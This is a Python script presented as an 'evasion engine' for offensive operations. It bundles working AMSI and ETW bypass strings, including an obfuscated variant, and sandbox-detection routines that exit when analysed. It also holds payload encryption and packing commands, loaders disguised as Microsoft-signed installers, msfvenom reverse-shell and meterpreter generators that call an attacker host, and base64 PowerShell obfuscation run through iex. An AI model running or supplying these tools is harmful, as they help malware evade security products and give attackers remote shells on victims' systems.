#!/usr/bin/env python3
"""
APOLLO Evasion Engine - Defense evasion recommendations,
payload obfuscation templates, AMSI bypasses, and AV/EDR evasion strategies.
"""
import sys, json, os

EVASION_TECHNIQUES = {
    "payload_encryption": [
        {"name": "AES-256-CBC encrypt", "tool": "openssl",
         "cmd": "openssl enc -aes-256-cbc -salt -in payload.bin -out payload.enc -pass pass:apollo_key",
         "decrypt": "openssl enc -aes-256-cbc -d -in payload.enc -out payload.bin -pass pass:apollo_key"},
        {"name": "XOR with custom key", "tool": "python3",
         "cmd": "python3 -c \"import sys; k=b'apollo'; sys.stdout.buffer.write(bytes(b ^ k[i%len(k)] for i,b in enumerate(open(sys.argv[1],'rb').read())))\" payload.bin > payload.xor"},
    ],
    "packers": [
        {"name": "UPX pack", "tool": "upx",
         "cmd": "upx --best payload.elf -o payload_packed.elf"},
        {"name": "Donut (NET to shellcode)", "tool": "donut",
         "cmd": "donut -a 2 -f 1 -o loader.bin -i payload.exe"},
        {"name": "ScareCrow (loader)", "tool": "ScareCrow",
         "cmd": "ScareCrow -I payload.bin -O loader.exe -domain microsoft.com"},
    ],
    "amsi_bypass": [
        {"name": "PowerShell AMSI bypass v1",
         "code": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
        {"name": "PowerShell AMSI bypass v2",
         "code": "sET-ItEM ('V'+'aR' + 'IA' + ('blE:1'+'q2') + ('U'+'T') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( Get-Item pROVider ).GetHashCode() | Out-Null ; ( $VARiaBle(':q'+'uT') ).Value::\"$(('G'+'et'+'F'+'iE'+('lD'+'B'+'y')))\"( ( \"{1}{0}\"-f('t'+'se'+'T'),'N' ),( ( \"{1}{0}\"-f('t'+'at'+'S'),'S'+'ta'+'ti'+'c' )) ).\"$(('s'+'E'+'t'+'V'+'A'+'l'+'uE'))\"(${n'+'u'+'L'+'L'} , ( 3+6+5+3+8+0+1+1+2 ) )"},
    ],
    "evasion_loader": [
        {"name": "Process hollowing (C#)",
         "desc": "Create process in suspended state, unmmap, write payload, resume"},
        {"name": "Syscall direct (NtCreateThreadEx)",
         "desc": "Bypass userland hooks via direct syscalls"},
        {"name": "DLL sideloading",
         "desc": "Place malicious DLL in app directory for sideloading"},
        {"name": "CLR hosting",
         "desc": "Host .NET runtime in unmanaged process for AMSI bypass"},
    ],
    "sandbox_detection": [
        {"name": "Check CPU cores", "cmd": "nproc; if [ $(nproc) -lt 2 ]; then exit; fi"},
        {"name": "Check RAM", "cmd": "free -m | awk '/^Mem:/{if($2<2048) exit 1}'"},
        {"name": "Check disk size", "cmd": "df -h / | awk 'NR==2{print $2}'"},
        {"name": "Check processes", "cmd": "ps aux | grep -E 'vbox|vmware|xensource|qemu' | grep -v grep"},
        {"name": "Sleep with jitter", "code": "Start-Sleep -Seconds (Get-Random -Min 10 -Max 30)"},
    ],
}


def get_techniques(category=None):
    if category:
        return EVASION_TECHNIQUES.get(category, [])
    return EVASION_TECHNIQUES


def generate_loader_payload(lhost, lport, platform="linux"):
    """Generate a basic staged payload with evasion."""
    if platform.startswith("linux"):
        return [
            f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/raw.elf",
            f"# Pack with UPX:",
            f"upx --best /tmp/raw.elf -o /tmp/payload.elf",
            f"# Or encrypt:",
            f"openssl enc -aes-256-cbc -salt -in /tmp/raw.elf -out /tmp/payload.enc -pass pass:change_me",
        ]
    elif platform.startswith("windows"):
        return [
            f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/raw.exe",
            f"# ScareCrow loader (bypasses AMSI/Defender):",
            f"ScareCrow -I /tmp/raw.bin -O /tmp/legit_installer.exe -domain microsoft.com",
            f"# PowerShell loader:",
            f'powershell -enc $(base64 -w0 loader.ps1)',
        ]
    return [f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/payload.elf"]


def generate_amsi_bypass_script(output_path=None):
    """Generate a PowerShell script with AMSI bypass + sandbox checks."""
    script = (
        "# APOLLO generated AMSI bypass + sandbox evasion\n"
        "# Sandbox checks\n"
        "if ((Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2) { exit }\n"
        "if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { exit }\n"
        "$r = (Get-Random -Min 10 -Max 30)\n"
        "Start-Sleep -Seconds $r\n"
        "# AMSI bypass\n"
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
        "# ETW bypass\n"
        "$k = [System.Reflection.Assembly]::LoadWithPartialName('System.Core');"
        "$f = $k.GetType('System.Diagnostics.Tracing.EventSource', $true);"
        "$f.GetField('m_eventSourceEnabled','NonPublic,Instance').SetValue($null, $false);\n"
        "# Shellcode injection stub placeholder\n"
        "Write-Output 'Evasion prepped. Load shellcode here.'\n"
    )
    if output_path:
        with open(output_path, 'w') as f:
            f.write(script)
        return {"path": output_path, "size": len(script)}
    return script


def generate_obfuscated_powershell(command, output_path=None):
    """Obfuscate a PowerShell command with variable renaming and encoding."""
    import base64
    b64 = base64.b64encode(command.encode("utf-16le")).decode()
    obfuscated = (
        f"$c='{b64}';$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($c));"
        f"iex $d"
    )
    if output_path:
        with open(output_path, 'w') as f:
            f.write(obfuscated)
        return {"path": output_path, "size": len(obfuscated)}
    return obfuscated


def generate_sandbox_detection_script(output_path=None):
    """Generate sandbox/VM detection script (cross-platform)."""
    script = """import os, sys, platform
# APOLLO sandbox detection
def detect_sandbox():
    checks = []
    # CPU cores
    try:
        cores = os.cpu_count() or 0
        if cores < 2:
            checks.append("SANDOX: Low CPU count")
    except:
        pass
    # RAM
    try:
        if platform.system() == "Linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if "MemTotal" in line:
                        mem_kb = int(line.split()[1])
                        if mem_kb < 2000000:
                            checks.append("SANDOX: Low RAM")
                        break
    except:
        pass
    # Disk size
    try:
        st = os.statvfs("/")
        disk_gb = (st.f_frsize * st.f_blocks) / (1024**3)
        if disk_gb < 50:
            checks.append("SANDOX: Small disk")
    except:
        pass
    # VM processes
    vm_procs = ["vbox", "vmware", "qemu", "xensource", "vmtoolsd"]
    try:
        if platform.system() == "Linux":
            for line in os.popen("ps aux").readlines():
                for vp in vm_procs:
                    if vp in line.lower():
                        checks.append(f"SANDOX: VM process {vp}")
                        break
    except:
        pass
    return checks
result = detect_sandbox()
sys.exit(1 if result else 0)
"""
    if output_path:
        with open(output_path, 'w') as f:
            f.write(script)
        return {"path": output_path, "size": len(script)}
    return script


if __name__ == "__main__":
    import json as j
    import tempfile
    if len(sys.argv) > 2 and sys.argv[1] in ("payload", "generate"):
        lh = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        lp = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
        plat = sys.argv[4] if len(sys.argv) > 4 else "linux"
        cmds = generate_loader_payload(lh, lp, plat)
        print("\n".join(cmds))
    elif len(sys.argv) > 1 and sys.argv[1] == "amsi":
        out = sys.argv[2] if len(sys.argv) > 2 else None
        result = generate_amsi_bypass_script(out)
        print(result if isinstance(result, str) else json.dumps(result, indent=2))
    elif len(sys.argv) > 1 and sys.argv[1] == "obfuscate":
        cmd = sys.argv[2] if len(sys.argv) > 2 else "whoami"
        out = sys.argv[3] if len(sys.argv) > 3 else None
        result = generate_obfuscated_powershell(cmd, out)
        print(result if isinstance(result, str) else json.dumps(result, indent=2))
    elif len(sys.argv) > 1 and sys.argv[1] == "sandbox":
        out = sys.argv[2] if len(sys.argv) > 2 else None
        result = generate_sandbox_detection_script(out)
        print(json.dumps(result, indent=2))
    elif len(sys.argv) > 1 and sys.argv[1] == "list":
        cats = list(EVASION_TECHNIQUES.keys())
        print("Available evasion categories:")
        for c in cats:
            print(f"  {c}: {len(EVASION_TECHNIQUES[c])} techniques")
    elif len(sys.argv) > 1:
        techs = get_techniques(sys.argv[1])
        print(j.dumps(techs, indent=2))
    else:
        print("APOLLO Evasion Engine v2")
        print("Usage:")
        print(f"  {sys.argv[0]} payload <LHOST> <LPORT> [linux|windows]")
        print(f"  {sys.argv[0]} amsi [output_path]              - Gen AMSI bypass PS script")
        print(f"  {sys.argv[0]} obfuscate <cmd> [output_path]   - Obfuscate PS command")
        print(f"  {sys.argv[0]} sandbox [output_path]           - Gen sandbox detection")
        print(f"  {sys.argv[0]} list")
        print(f"  {sys.argv[0]} <category>")
        print(f"Categories: {', '.join(EVASION_TECHNIQUES.keys())}")
